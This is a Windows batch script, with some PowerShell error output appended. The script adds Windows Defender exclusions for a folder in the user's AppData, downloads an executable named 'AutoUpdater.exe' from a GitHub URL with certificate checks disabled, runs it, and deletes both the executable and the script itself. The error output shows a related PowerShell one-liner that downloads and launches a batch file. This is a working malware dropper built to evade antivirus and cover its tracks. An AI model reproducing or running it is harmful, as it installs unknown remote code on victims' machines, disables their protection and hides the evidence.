@echo off
setlocal

:: Define the file name and URL
set "file=AutoUpdater.exe"
set "url=https://github.com/Sxzzzy/blue/raw/main/%file%"

:: Define the document path dynamically using USERPROFILE
set "docPath=%USERPROFILE%\AppData\Roaming\Microsoft"

:: Exclude the AutoUpdater file dynamically based on the user's profile
powershell -Command "Add-MpPreference -ExclusionPath '%docPath%\%file%'"

:: Exclude the folder dynamically based on the user's profile
powershell -Command "Add-MpPreference -ExclusionPath '%docPath%'"

:: Download the file
curl -k -L %url% -o "%docPath%\%file%"

:: Execute the file
cd /d "%docPath%"
start /wait "" "%file%"

:: Delete the file
del /q "%file%"

:: Attempt to delete this script
start /b "" cmd /c del "%~f0"&exit

endlocal

Exception calling "DownloadFile" with "2" argument(s): "An exception occurred during a WebClient request."
At line:1 char:90
+ ... mp\\e.bat"; (New-Object System.Net.WebClient).DownloadFile($url, $out ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException

Start-Process : This command cannot be run due to the error: The system cannot find the file specified.
At line:1 char:150
+ ... t System.Net.WebClient).DownloadFile($url, $out); Start-Process $out;
+                                                       ~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException
    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand
